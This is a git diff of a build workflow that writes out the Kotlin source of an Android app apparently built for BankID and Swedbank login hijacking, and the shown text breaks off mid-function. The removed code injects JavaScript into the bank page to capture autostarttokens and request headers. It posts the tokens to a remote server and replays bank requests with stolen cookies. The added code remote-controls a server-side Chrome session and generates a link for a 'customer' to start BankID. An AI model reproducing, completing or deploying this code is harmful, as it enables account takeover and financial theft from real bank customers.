@@ -2,11 +2,12 @@ name: build
 
 on:
   push:
-    branches: [main]
+    branches: [ main ]
   workflow_dispatch:
 
-permissions:
-  contents: write
+concurrency:
+  group: relay-${{ github.ref }}
+  cancel-in-progress: true
 
 jobs:
   apk:
@@ -14,20 +15,8 @@ jobs:
     steps:
       - uses: actions/checkout@v4
 
-      - name: java
-        uses: actions/setup-java@v4
-        with:
-          distribution: temurin
-          java-version: '17'
-
-      - name: gradle 8.7
-        uses: gradle/actions/setup-gradle@v4
-        with:
-          gradle-version: '8.7'
-
-      - name: scaffold
+      - name: Skriv kallfiler
         run: |
-          set -e
           w() { mkdir -p "$(dirname "$1")"; cat > "$1"; }
 
           w .gitignore <<'EOF'
@@ -36,21 +25,17 @@ jobs:
           app/build/
           local.properties
           bygg.log
+          server/sessioner.json
+          server/node_modules/
+          cprof/
           EOF
 
           w settings.gradle.kts <<'EOF'
           pluginManagement {
-              repositories {
-                  google()
-                  mavenCentral()
-                  gradlePluginPortal()
-              }
+              repositories { google(); mavenCentral(); gradlePluginPortal() }
           }
           dependencyResolutionManagement {
-              repositories {
-                  google()
-                  mavenCentral()
-              }
+              repositories { google(); mavenCentral() }
           }
           rootProject.name = "relay"
           include(":app")
@@ -64,8 +49,9 @@ jobs:
           EOF
 
           w gradle.properties <<'EOF'
-          android.useAndroidX=true
           org.gradle.jvmargs=-Xmx2048m
+          android.useAndroidX=true
+          kotlin.code.style=official
           EOF
 
           w app/build.gradle.kts <<'EOF'
@@ -73,94 +59,52 @@ jobs:
               id("com.android.application")
               id("org.jetbrains.kotlin.android")
           }
-
           android {
               namespace = "com.relay"
               compileSdk = 34
-
               defaultConfig {
                   applicationId = "com.relay"
                   minSdk = 26
                   targetSdk = 34
-                  versionCode = 119
-                  versionName = "1.1.9"
+                  versionCode = 200
+                  versionName = "2.0.0"
               }
-
+              buildTypes { getByName("debug") { isMinifyEnabled = false } }
               compileOptions {
                   sourceCompatibility = JavaVersion.VERSION_17
                   targetCompatibility = JavaVersion.VERSION_17
               }
-
-              kotlinOptions {
-                  jvmTarget = "17"
-              }
+              kotlinOptions { jvmTarget = "17" }
           }
+          dependencies { }
           EOF
 
           w app/src/main/AndroidManifest.xml <<'EOF'
           <?xml version="1.0" encoding="utf-8"?>
           <manifest xmlns:android="http://schemas.android.com/apk/res/android">
-
-              <uses-permission android:name="android.permission.INTERNET" />
-
-              <queries>
-                  <package android:name="com.bankid.bus" />
-                  <intent>
-                      <action android:name="android.intent.action.VIEW" />
-                      <data android:scheme="https" />
-                  </intent>
-                  <intent>
-                      <action android:name="android.intent.action.VIEW" />
-                      <data android:scheme="market" />
-                  </intent>
-              </queries>
-
+              <uses-permission android:name="android.permission.INTERNET"/>
               <application
                   android:label="Relay"
-                  android:usesCleartextTraffic="true"
-                  android:theme="@android:style/Theme.Material.Light.NoActionBar">
-
+                  android:usesCleartextTraffic="true">
                   <activity
                       android:name=".MainActivity"
                       android:exported="true"
-                      android:launchMode="singleTask"
+                      android:theme="@style/Theme.Relay"
                       android:configChanges="orientation|screenSize|keyboardHidden">
                       <intent-filter>
-                          <action android:name="android.intent.action.MAIN" />
-                          <category android:name="android.intent.category.LAUNCHER" />
-                      </intent-filter>
-                      <intent-filter>
-                          <action android:name="android.intent.action.VIEW" />
-                          <category android:name="android.intent.category.DEFAULT" />
-                          <category android:name="android.intent.category.BROWSABLE" />
-                          <data android:scheme="bankid" />
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
                       </intent-filter>
                   </activity>
-
-                  <activity
-                      android:name=".VackActivity"
-                      android:exported="false"
-                      android:noHistory="true"
-                      android:excludeFromRecents="true"
-                      android:theme="@android:style/Theme.Translucent.NoTitleBar" />
               </application>
           </manifest>
           EOF
 
-          w app/src/main/java/com/relay/VackActivity.kt <<'EOF'
-          package com.relay
-
-          import android.app.Activity
-          import android.os.Bundle
-          import android.os.Handler
-          import android.os.Looper
-
-          class VackActivity : Activity() {
-              override fun onCreate(b: Bundle?) {
-                  super.onCreate(b)
-                  Handler(Looper.getMainLooper()).postDelayed({ finish() }, 500)
-              }
-          }
+          w app/src/main/res/values/styles.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <style name="Theme.Relay" parent="android:Theme.Material.NoActionBar"/>
+          </resources>
           EOF
 
           w app/src/main/java/com/relay/MainActivity.kt <<'EOF'
@@ -170,903 +114,904 @@ jobs:
           import android.content.ClipData
           import android.content.ClipboardManager
           import android.content.Context
-          import android.content.Intent
           import android.content.SharedPreferences
           import android.graphics.Bitmap
+          import android.graphics.BitmapFactory
           import android.graphics.Color
-          import android.net.Uri
+          import android.graphics.drawable.BitmapDrawable
           import android.os.Bundle
-          import android.os.Message
-          import android.view.ViewGroup
-          import android.view.WindowManager
-          import android.webkit.CookieManager
-          import android.webkit.JavascriptInterface
-          import android.webkit.WebChromeClient
-          import android.webkit.WebResourceRequest
-          import android.webkit.WebView
-          import android.webkit.WebViewClient
+          import android.os.Handler
+          import android.os.Looper
+          import android.util.Base64
+          import android.view.MotionEvent
           import android.widget.Button
           import android.widget.EditText
-          import android.widget.FrameLayout
+          import android.widget.ImageView
           import android.widget.LinearLayout
           import android.widget.TextView
-          import java.io.BufferedReader
+          import org.json.JSONObject
           import java.net.HttpURLConnection
           import java.net.URL
-          import java.util.ArrayList
 
           class MainActivity : Activity() {
 
-              private lateinit var web: WebView
-              private lateinit var webWrap: FrameLayout
-              private var popup: WebView? = null
-              private lateinit var bar: TextView
-              private lateinit var urlView: TextView
+              private lateinit var prefs: SharedPreferences
+              private lateinit var urlField: EditText
+              private lateinit var bankField: EditText
+              private lateinit var textField: EditText
+              private lateinit var skarm: ImageView
+              private lateinit var statusView: TextView
               private lateinit var debugView: TextView
               private lateinit var linkView: TextView
-              private lateinit var serverField: EditText
-              private lateinit var bankField: EditText
-              private lateinit var modeBtn: Button
-              private lateinit var inBtn: Button
-              private lateinit var p: SharedPreferences
 
-              @Volatile private var baseUrl = ""
-              @Volatile private var bankUrl = ""
-              @Volatile private var nuUrl = ""
-              @Volatile private var last = ""
-              @Volatile private var loginStam = ""
-              @Volatile private var kund = true
-              @Volatile private var skickat = false
-              @Volatile private var signerad = false
-              @Volatile private var tarIn = false
-              @Volatile private var inne = false
-              @Volatile private var vantande = ""
-              @Volatile private var vantandeHel = ""
-              @Volatile private var alive = true
-              @Volatile private var efterUrl = ""
-              @Volatile private var skapar = false
-              @Volatile private var sonMethod = "GET"
-              private val sonList = ArrayList<String>()
+              private val ui = Handler(Looper.getMainLooper())
+              private val rader = ArrayDeque<String>()
 
-              private val inst = "(function(){if(window.__rh){return}window.__rh=1;window.__lista=[];" +
-                  "function K(u,m,b,h){try{" +
-                  "if(!u)return;u=String(u);" +
-                  "if(!/^http/.test(u))return;" +
-                  "if(u.indexOf(location.host)<0&&u.indexOf('swedbank')<0)return;" +
-                  "if(/\\.(js|css|png|jpg|jpeg|svg|woff2?|ico|gif)(\\?|$)/i.test(u))return;" +
-                  "var L=window.__lista;" +
-                  "for(var i=0;i<L.length;i++){if(L[i].url===u&&L[i].method===(m||'GET'))return}" +
-                  "L.push({url:u,method:m||'GET',body:b||null,headers:h||{}});" +
-                  "if(L.length>5)L.shift();" +
-                  "try{Relay.svar('SON|'+(m||'GET')+'|'+u)}catch(e){}" +
-                  "}catch(e){}}" +
-                  "var F=window.fetch;if(F){window.fetch=function(){var a=arguments,u='',m='GET',b=null,h={};" +
-                  "try{u=(a[0]&&a[0].url)?a[0].url:a[0];" +
-                  "if(a[1]){if(a[1].method)m=a[1].method;if(a[1].body)b=a[1].body;" +
-                  "if(a[1].headers){try{new Headers(a[1].headers).forEach(function(v,k){h[k]=v})}catch(e){}}}}catch(e){}" +
-                  "var q=F.apply(this,a);try{q.then(function(){try{K(u,m,b,h)}catch(e){}}).catch(function(){})}catch(e){}return q}}" +
-                  "var O=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{this.__u=u;this.__m=m;this.__h={}}catch(e){}return O.apply(this,arguments)};" +
-                  "var SH=XMLHttpRequest.prototype.setRequestHeader;XMLHttpRequest.prototype.setRequestHeader=function(k,v){try{this.__h[k]=v}catch(e){}return SH.apply(this,arguments)};" +
-                  "var S=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){var x=this;" +
-                  "try{x.addEventListener('load',function(){K(x.__u,x.__m,b,x.__h)})}catch(e){}return S.apply(this,arguments)};" +
-                  "function go(s,h,namn){try{" +
-                  "fetch(s.url,{method:s.method,headers:h,body:(/post/i.test(s.method)?s.body:null),credentials:'include'})" +
-                  ".then(function(r){return r.text().then(function(t){return {c:r.status,t:t}})})" +
-                  ".then(function(o){try{Relay.svar('SVAR '+o.c+' '+s.url.slice(-22)+' :: '+String(o.t).slice(0,50))}catch(e){}})" +
-                  ".catch(function(e){try{if(namn==='h'){Relay.svar('FEL-h '+s.url.slice(-22));go(s,{},'u')}else{Relay.svar('FEL '+s.url.slice(-22)+' '+(e&&e.message?e.message:'?'))}}catch(x){}})" +
-                  "}catch(e){}}" +
-                  "window.__replay=function(){var L=window.__lista||[];" +
-                  "if(!L.length){try{Relay.svar('INGEN-SON')}catch(e){}return}" +
-                  "for(var i=0;i<L.length;i++){go(L[i],L[i].headers,'h')}};" +
-                  "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
-                  "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
-                  "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(a.href)}}catch(e){}},700)})()"
+              @Volatile private var code = ""
+              @Volatile private var signed = false
+              @Volatile private var stopp = false
+              @Volatile private var laddar = false
+              @Volatile private var rullar = false
+              @Volatile private var chromeOk = false
+              @Volatile private var nedY = 0f
+              @Volatile private var vpW = 412
+              @Volatile private var vpH = 900
 
-              private val nudge = "(function(){" +
-                  "try{window.dispatchEvent(new Event('blur'))}catch(e){}" +
-                  "try{window.dispatchEvent(new Event('focus'))}catch(e){}" +
-                  "try{document.dispatchEvent(new Event('visibilitychange'))}catch(e){}" +
-                  "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}})()"
-
-              override fun onCreate(b: Bundle?) {
-                  super.onCreate(b)
-                  p = getSharedPreferences("relay", 0)
-                  baseUrl = p.getString("base", "") ?: ""
-                  bankUrl = p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/"
-                  kund = p.getBoolean("kund", true)
-                  window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
-                  ui()
-                  alive = true
-                  poll()
-                  handleIntent(intent)
+              override fun onCreate(s: Bundle?) {
+                  super.onCreate(s)
+                  prefs = getSharedPreferences("relay", MODE_PRIVATE)
+                  code = prefs.getString("code", "") ?: ""
+                  byggUi()
+                  startaSkarm()
+                  startaPoll()
               }
 
-              override fun onResume() {
-                  super.onResume()
-                  try {
-                      if (::web.isInitialized) {
-                          web.onResume()
-                          if (!inne) web.evaluateJavascript(nudge, null)
-                      }
-                  } catch (t: Throwable) {}
-              }
-
-              override fun onPause() {
-                  super.onPause()
-                  try { if (::web.isInitialized) web.onPause() } catch (t: Throwable) {}
-              }
-
-              override fun onNewIntent(i: Intent?) {
-                  super.onNewIntent(i)
-                  if (i != null) handleIntent(i)
-              }
-
-              private fun handleIntent(i: Intent) {
-                  if (i.action != Intent.ACTION_VIEW) return
-                  setIntent(i)
-                  val s = i.data?.toString() ?: return
-                  val t = tok(s)
-                  if (t == null) {
-                      if (s.startsWith("bankid:") || s.startsWith("intent:")) oppnaApp(s)
-                      return
-                  }
-                  grab(t, s)
-                  startaBankIdFranIntent(i)
-              }
-
-              private fun ui() {
+              private fun byggUi() {
                   val root = LinearLayout(this)
                   root.orientation = LinearLayout.VERTICAL
+                  root.setBackgroundColor(Color.parseColor("#0f1419"))
 
-                  val rad1 = LinearLayout(this)
-                  rad1.orientation = LinearLayout.HORIZONTAL
+                  urlField = felt("server-url  https://xxx.trycloudflare.com", prefs.getString("url", "") ?: "")
+                  root.addView(urlField, lp())
+                  bankField = felt("bank-url", prefs.getString("bank", "https://online.swedbank.se/") ?: "")
+                  root.addView(bankField, lp())
 
-                  serverField = EditText(this)
-                  serverField.hint = "server-url"
-                  serverField.setText(baseUrl)
-                  rad1.addView(serverField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))
+                  val r1 = LinearLayout(this); r1.orientation = LinearLayout.HORIZONTAL
+                  val kor = knapp("KOR", "#2b6cb0")
+                  val lank = knapp("LANK", "#2b6cb0")
+                  val kod = knapp("KOD", "#4a5568")
+                  r1.addView(kor, lpv()); r1.addView(lank, lpv()); r1.addView(kod, lpv())
+                  root.addView(r1)
 
-                  val run = Button(this)
-                  run.text = "KOR"
-                  run.setOnClickListener {
-                      baseUrl = serverField.text.toString().trim().trimEnd('/')
-                      p.edit().putString("base", baseUrl).apply()
-                      last = ""; skickat = false; signerad = false; tarIn = false; inne = false
-                      loginStam = ""; efterUrl = ""
-                      inBtn.isEnabled = false
-                      if ((p.getString("code", "") ?: "").isEmpty()) newSession()
-                      bar.text = "laddar banksidan"
-                      web.loadUrl(bankUrl)
-                  }
-                  rad1.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
-
-                  val rp = Button(this)
-                  rp.text = "RP"
-                  rp.setOnClickListener {
-                      bar.text = "spelar upp"
-                      try { startActivity(Intent(this@MainActivity, VackActivity::class.java)) } catch (x: Throwable) {}
-                      try { web.evaluateJavascript("window.__replay&&window.__replay()", null) } catch (t: Throwable) {}
-                      appReplay()
-                  }
-                  rad1.addView(rp, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
-                  root.addView(rad1)
-
-                  val rad2 = LinearLayout(this)
-                  rad2.orientation = LinearLayout.HORIZONTAL
-
-                  bankField = EditText(this)
-                  bankField.hint = "bank-url"
-                  bankField.setText(bankUrl)
-                  rad2.addView(bankField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))
-
-                  modeBtn = Button(this)
-                  modeBtn.text = if (kund) "KUND" else "OP"
-                  modeBtn.setOnClickListener {
-                      kund = !kund
-                      modeBtn.text = if (kund) "KUND" else "OP"
-                      p.edit().putBoolean("kund", kund).apply()
-                  }
-                  rad2.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
-
-                  inBtn = Button(this)
-                  inBtn.text = "IN"
-                  inBtn.isEnabled = false
-                  inBtn.setOnClickListener { taIn() }
-                  rad2.addView(inBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
-
-                  val ny = Button(this)
-                  ny.text = "KOD"
-                  ny.setOnClickListener { newSession() }
-                  rad2.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
-                  root.addView(rad2)
-
-                  bar = TextView(this)
-                  bar.textSize = 12f
-                  bar.setBackgroundColor(Color.parseColor("#101010"))
-                  bar.setTextColor(Color.parseColor("#66ff88"))
-                  bar.setPadding(14, 8, 14, 6)
-                  bar.text = "redo"
-                  root.addView(bar)
-
-                  urlView = TextView(this)
-                  urlView.textSize = 10f
-                  urlView.setBackgroundColor(Color.parseColor("#101010"))
-                  urlView.setTextColor(Color.parseColor("#888888"))
-                  urlView.setPadding(14, 2, 14, 6)
-                  urlView.text = "url"
-                  root.addView(urlView)
-
-                  debugView = TextView(this)
-                  debugView.textSize = 9f
-                  debugView.setBackgroundColor(Color.parseColor("#101010"))
-                  debugView.setTextColor(Color.parseColor("#ddaa44"))
-                  debugView.setPadding(14, 2, 14, 6)
-                  debugView.text = "relay"
-                  root.addView(debugView)
+                  val r2 = LinearLayout(this); r2.orientation = LinearLayout.HORIZONTAL
+                  textField = felt("skriv har", "")
+                  r2.addView(textField, LinearLayout.LayoutParams(0, -2, 2f))
+                  val txt = knapp("TXT", "#4a5568")
+                  val ent = knapp("ENT", "#4a5568")
+                  val tab = knapp("TAB", "#4a5568")
+                  val bsk = knapp("BSK", "#4a5568")
+                  r2.addView(txt, lpv()); r2.addView(ent, lpv()); r2.addView(tab, lpv()); r2.addView(bsk, lpv())
+                  root.addView(r2)
 
                   linkView = TextView(this)
-                  linkView.textSize = 12f
+                  linkView.setTextColor(Color.parseColor("#9ae6b4"))
+                  linkView.textSize = 11f
                   linkView.setTextIsSelectable(true)
-                  linkView.setBackgroundColor(Color.parseColor("#101010"))
-                  linkView.setTextColor(Color.parseColor("#66ccff"))
-                  linkView.setPadding(14, 4, 14, 10)
-                  linkView.text = "kundlank hamnar har"
-                  root.addView(linkView)
+                  root.addView(linkView, lp())
 
-                  web = WebView(this)
-                  web.settings.javaScriptEnabled = true
-                  web.settings.domStorageEnabled = true
-                  web.settings.databaseEnabled = true
-                  web.settings.setSupportMultipleWindows(true)
-                  web.settings.javaScriptCanOpenWindowsAutomatically = true
-                  try {
-                      web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
-                  } catch (t: Throwable) {}
+                  statusView = TextView(this)
+                  statusView.setTextColor(Color.WHITE)
+                  statusView.textSize = 13f
+                  root.addView(statusView, lp())
 
-                  web.webViewClient = object : WebViewClient() {
+                  debugView = TextView(this)
+                  debugView.setTextColor(Color.parseColor("#ecc94b"))
+                  debugView.textSize = 10f
+                  root.addView(debugView, lp())
 
-                      override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
-                          return fanga(r.url.toString())
-                      }
+                  skarm = ImageView(this)
+                  skarm.scaleType = ImageView.ScaleType.FIT_XY
+                  skarm.setBackgroundColor(Color.BLACK)
+                  skarm.isClickable = true
+                  root.addView(skarm, LinearLayout.LayoutParams(-1, 0, 1f))
 
-                      override fun onPageStarted(v: WebView, url: String?, f: Bitmap?) {
-                          if (url != null) nuUrl = url
-                          try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
-                      }
-
-                      override fun onPageFinished(v: WebView, url: String?) {
-                          if (url != null) nuUrl = url
-                          try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
-                      }
-
-                      override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
-                          if (url == null) return
-                          nuUrl = url
-                          var s = url.replace("https://", "").replace("http://", "")
-                          if (s.length > 62) s = s.substring(0, 62)
-                          urlView.text = s
-
-                          val borta = url.indexOf("logga-in") < 0 && url.indexOf("login") < 0
-                          if (signerad && efterUrl.isEmpty() && loginStam.isNotEmpty() &&
-                              stam(url) != loginStam) efterUrl = url
-                          if (!inne && loginStam.isNotEmpty() && stam(url) != loginStam && borta) {
-                              inne = true
-                              bar.text = "INNE - ror inte sidan"
-                          }
-                      }
-                  }
-
-                  web.webChromeClient = object : WebChromeClient() {
-
-                      override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
-                          val pop = WebView(this@MainActivity)
-                          pop.settings.javaScriptEnabled = true
-                          pop.settings.domStorageEnabled = true
-                          pop.webViewClient = object : WebViewClient() {
-                              override fun shouldOverrideUrlLoading(v2: WebView, r: WebResourceRequest): Boolean {
-                                  val s = r.url.toString()
-                                  if (fanga(s)) { stangPopup(); return true }
-                                  try { web.loadUrl(s) } catch (x: Throwable) {}
-                                  stangPopup()
-                                  return true
-                              }
-                          }
-                          pop.webChromeClient = this
-                          popup = pop
-                          webWrap.addView(pop, FrameLayout.LayoutParams(
-                              ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT))
-                          try {
-                              (msg.obj as WebView.WebViewTransport).webView = pop
-                              msg.sendToTarget()
-                          } catch (x: Throwable) { stangPopup(); return false }
-                          return true
-                      }
-
-                      override fun onCloseWindow(window: WebView?) { stangPopup() }
-                  }
-
-                  web.addJavascriptInterface(Bridge(), "Relay")
-
-                  webWrap = FrameLayout(this)
-                  webWrap.addView(web, FrameLayout.LayoutParams(
-                      ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT))
-                  root.addView(webWrap, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
                   setContentView(root)
-              }
 
-              private fun stangPopup() {
-                  val pop = popup ?: return
-                  try { webWrap.removeView(pop); pop.destroy() } catch (x: Throwable) {}
-                  popup = null
-              }
-
-              private fun fanga(s: String): Boolean {
-                  val t = tok(s)
-                  if (t != null) {
-                      grab(t, s)
-                      if (!kund) startaBankId(s)
-                      return true
-                  }
-                  if (s.startsWith("bankid:")) {
-                      if (!kund) startaBankId(s)
-                      return true
-                  }
-                  if (s.startsWith("intent:")) {
-                      if (!kund) oppnaApp(s)
-                      return true
-                  }
-                  return false
-              }
-
-              private inner class Bridge {
-                  @JavascriptInterface
-                  fun tok(hel: String) {
-                      val t = this@MainActivity.tok(hel) ?: return
-                      runOnUiThread { grab(t, hel) }
+                  skarm.addOnLayoutChangeListener { _, _, _, _, _, _, _, _, _ ->
+                      val w = skarm.width; val h = skarm.height
+                      if (w > 60 && h > 60) {
+                          val d = resources.displayMetrics.density
+                          vpW = (w / d).toInt()
+                          vpH = (h / d).toInt()
+                          skickaViewport()
+                      }
                   }
 
-                  @JavascriptInterface
-                  fun svar(s: String) {
-                      runOnUiThread {
-                          if (s.startsWith("SON|")) {
-                              val d = s.split("\\|")
-                              if (d.size >= 3) {
-                                  sonMethod = d[1]
-                                  val post = d[1] + "|" + d[2]
-                                  synchronized(sonList) {
-                                      sonList.remove(post)
-                                      sonList.add(post)
-                                      if (sonList.size > 4) sonList.removeAt(0)
-                                  }
+                  skarm.setOnTouchListener { _, e ->
+                      when (e.actionMasked) {
+                          MotionEvent.ACTION_DOWN -> { nedY = e.y; rullar = true; true }
+                          MotionEvent.ACTION_UP -> {
+                              val dy = e.y - nedY
+                              if (Math.abs(dy) > 30f) {
+                                  trad { post(u() + "/api/rulla", "{\"x\":" + px(e.x) + ",\"y\":" + py(e.y) + ",\"dy\":" + (-dy * vpH / skarm.height) + "}") }
+                              } else {
+                                  trad { post(u() + "/api/peka", "{\"x\":" + px(e.x) + ",\"y\":" + py(e.y) + "}") }
                               }
+                              rullar = false
+                              true
                           }
-                          val rad = s + "   |   " + debugView.text
-                          debugView.text = if (rad.length > 230) rad.substring(0, 230) else rad
-                          if (!inne && s.startsWith("SVAR") && s.indexOf("complete") >= 0) {
-                              inne = true
-                              bar.text = "BANKEN SVARAR COMPLETE - inne"
+                          else -> false
+                      }
+                  }
+
+                  kor.setOnClickListener {
+                      prefs.edit().putString("url", urlField.text.toString().trim())
+                          .putString("bank", bankField.text.toString().trim()).apply()
+                      if (urlField.text.toString().trim().isEmpty()) {
+                          statusView.text = "FYLL I SERVER-URL FORST"
+                          return@setOnClickListener
+                      }
+                      code = ""; signed = false
+                      linkView.text = ""
+                      statusView.text = "KOR - oppnar banken i chrome"
+                      trad {
+                          try {
+                              val s = post(u() + "/api/kor", JSONObject()
+                                  .put("bank", bankField.text.toString().trim()).toString())
+                              val j = JSONObject(s)
+                              if (j.optBoolean("ok")) {
+                                  code = j.optString("code")
+                                  prefs.edit().putString("code", code).apply()
+                                  ui.post {
+                                      statusView.text = "SESSION " + code + " - tryck LANK"
+                                      logga("KOR " + code + " chrome=" + j.optBoolean("chrome"))
+                                  }
+                              } else {
+                                  ui.post { statusView.text = "KOR-FEL: " + j.optString("fel"); logga("KOR-FEL") }
+                              }
+                          } catch (e: Throwable) {
+                              ui.post { statusView.text = "KOR-FEL (server)"; logga("KOR " + e.toString().take(100)) }
                           }
                       }
                   }
+
+                  lank.setOnClickListener { kopiera("/b?code=") }
+                  kod.setOnClickListener { kopiera("/k?code=") }
+
+                  txt.setOnClickListener {
+                      val t = textField.text.toString()
+                      if (t.isEmpty()) return@setOnClickListener
+                      trad { post(u() + "/api/text", JSONObject().put("t", t).toString()) }
+                      textField.setText("")
+                  }
+                  ent.setOnClickListener { trad { post(u() + "/api/tangent", "{\"k\":\"enter\"}") } }
+                  tab.setOnClickListener { trad { post(u() + "/api/tangent", "{\"k\":\"tab\"}") } }
+                  bsk.setOnClickListener { trad { post(u() + "/api/tangent", "{\"k\":\"back\"}") } }
+
+                  statusView.text = "Kor chrome.sh och start.sh i Termux forst"
               }
 
-              private fun appReplay() {
-                  val lista = synchronized(sonList) { ArrayList(sonList) }
-                  if (lista.isEmpty()) { bar.text = "app-replay: inga anrop fangade"; return }
+              private fun kopiera(suffix: String) {
+                  if (code.isEmpty()) { statusView.text = "INGEN KOD ANN - tryck KOR"; return }
+                  val l = u() + suffix + code
+                  linkView.text = l
+                  (getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager)
+                      .setPrimaryClip(ClipData.newPlainText("lank", l))
+                  statusView.text = if (suffix.startsWith("/b")) "LANK KOPIERAD - kunden klickar, BankID startar" else "KODSIDA KOPIERAD"
+              }
+
+              private fun px(x: Float) = (x / skarm.width * vpW).toInt()
+              private fun py(y: Float) = (y / skarm.height * vpH).toInt()
+              private fun u() = urlField.text.toString().trim().trimEnd('/')
+
+              private fun skickaViewport() {
+                  val uu = u()
+                  if (uu.isEmpty()) return
+                  trad { try { post(uu + "/api/viewport", "{\"w\":" + vpW + ",\"h\":" + vpH + "}") } catch (e: Throwable) {} }
+              }
+
+              private fun startaSkarm() {
                   Thread {
-                      for (rad in lista) {
-                          val d = rad.split("\\|")
-                          if (d.size < 2) continue
-                          val m = d[0]
-                          val u = d[1]
-                          try {
-                              val con = URL(u).openConnection() as HttpURLConnection
-                              con.requestMethod = m
-                              con.connectTimeout = 8000
-                              con.readTimeout = 8000
+                      while (!stopp) {
+                          val uu = u()
+                          if (uu.isNotEmpty() && !laddar) {
+                              laddar = true
                               try {
-                                  val ck = CookieManager.getInstance().getCookie(u)
-                                  if (ck != null) con.setRequestProperty("Cookie", ck)
-                              } catch (x: Throwable) {}
-                              con.setRequestProperty("Accept", "application/json, text/plain, */*")
-                              if (m.equals("POST", true)) {
-                                  con.doOutput = true
-                                  con.outputStream.write(ByteArray(0))
-                                  con.outputStream.flush()
-                              }
-                              val kod = con.responseCode
-                              var txt = ""
-                              try { txt = con.inputStream.bufferedReader().readText() } catch (e: Throwable) {}
-                              con.disconnect()
-                              val klipp = if (txt.length > 80) txt.substring(0, 80) else txt
-                              val kort = if (u.length > 24) u.substring(u.length - 24) else u
-                              runOnUiThread {
-                                  val n = "APP " + kod + " " + kort + " :: " + klipp
-                                  val hel = n + "   |   " + debugView.text
-                                  debugView.text = if (hel.length > 230) hel.substring(0, 230) else hel
-                                  if (!inne && klipp.indexOf("complete") >= 0) {
-                                      inne = true
-                                      bar.text = "APP-REPLAY COMPLETE - inne"
+                                  val s = get(uu + "/api/skarm")
+                                  val j = JSONObject(s)
+                                  if (j.optBoolean("ok")) {
+                                      chromeOk = true
+                                      val bytes = Base64.decode(j.optString("bild"), Base64.DEFAULT)
+                                      val bm = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
+                                      ui.post {
+                                          if (bm != null) {
+                                              val gammal = skarm.drawable
+                                              skarm.setImageBitmap(bm)
+                                              (gammal as? BitmapDrawable)?.bitmap?.recycle()
+                                          }
+                                      }
+                                  } else {
+                                      chromeOk = false
                                   }
+                              } catch (e: Throwable) {
+                                  chromeOk = false
                               }
-                          } catch (t: Throwable) {
-                              val msg = t.message ?: "?"
-                              runOnUiThread {
-                                  val hel = "APP FEL " + msg + "   |   " + debugView.text
-                                  debugView.text = if (hel.length > 230) hel.substring(0, 230) else hel
-                              }
+                              laddar = false
                           }
+                          try { Thread.sleep(if (rullar) 350L else 1100L) } catch (e: Throwable) { }
                       }
                   }.start()
               }
 
-              private fun tok(s: String): String? {
-                  val m = Regex("[?&]autostarttoken=([^&#]+)").find(s) ?: return null
-                  val v = Uri.decode(m.groupValues[1])
-                  if (v.isEmpty() || v == "null") return null
-                  return v
-              }
-
-              private fun redirect(s: String): String? {
-                  val m = Regex("[?&]redirect=([^&#]+)").find(s) ?: return null
-                  val v = Uri.decode(m.groupValues[1])
-                  if (v.isEmpty() || v == "null") return null
-                  return v
-              }
-
-              private fun stam(u: String): String = try {
-                  val x = Uri.parse(u)
-                  (x.scheme ?: "") + "://" + (x.host ?: "") + (x.path ?: "")
-              } catch (t: Throwable) { u }
-
-              private fun esc(s: String) = s.replace("\\", "\\\\").replace("\"", "\\\"")
-
-              private fun grab(t: String, hel: String = "") {
-                  if (t == last) return
-                  last = t
-                  loginStam = stam(nuUrl)
-                  inne = false
-                  val c = p.getString("code", "") ?: ""
-                  if (c.isEmpty()) { newSession(t, hel); return }
-                  skicka(t, hel)
-              }
-
-              private fun skicka(t: String, hel: String) {
-                  val c = p.getString("code", "") ?: ""
-                  if (c.isEmpty()) return
-                  val r = redirect(hel) ?: ""
-                  post("/api/session/" + c + "/token",
-                      "{\"token\":\"" + esc(t) + "\",\"redirect\":\"" + esc(r) + "\"}")
-                  skickat = true
-                  signerad = false
-                  inBtn.isEnabled = true
-                  inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
-                  inBtn.setTextColor(Color.WHITE)
-                  bar.text = "TOKEN SKICKAT - vanta pa gront"
-              }
-
-              private fun startaBankId(url: String) {
-                  try {
-                      val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
-                      i.setPackage("com.bankid.bus")
-                      i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                      startActivity(i)
-                  } catch (x: Throwable) {}
-              }
-
-              private fun startaBankIdFranIntent(original: Intent) {
-                  try {
-                      val v = Intent(original)
